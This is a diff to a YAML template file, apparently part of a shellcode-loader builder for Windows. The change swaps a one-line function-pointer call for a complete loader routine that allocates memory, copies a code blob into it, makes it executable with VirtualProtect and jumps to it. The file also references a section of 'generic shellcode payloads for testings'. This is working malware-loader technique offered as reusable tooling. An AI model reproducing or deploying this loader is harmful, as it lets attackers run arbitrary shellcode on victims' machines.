@@ -54,7 +54,7 @@ templates:
     content: |
       #define WIN32_LEAN_AND_MEAN
       #include <windows.h>
-      #include "Win32Helper.h"
+      //#include "Win32Helper.h"
 
       INT main(VOID)
       {
@@ -120,7 +120,24 @@ sections:
       - id: "PayloadExecViaFuncPtr"
         display: "Payload Execution Via Function Pointer"
         snippet: |
-          (*(VOID(*)()) pShellcodeAddress)();
+              void* executableMemory = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+              if (executableMemory == NULL) {
+                  return -1;
+              }
+
+              memcpy(executableMemory, code_blob, code_blob_len);
+
+              DWORD oldProtect;
+              if (!VirtualProtect(executableMemory, code_blob_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                  return -1;
+              }
+
+              ((void(*)()) executableMemory)();
+
+              VirtualFree(executableMemory, 0, MEM_RELEASE);
+
+
 
   - header: "GENERIC SHELLCODE PAYLOADS FOR TESTINGS"
     template: "GENERICSHELLCODE"
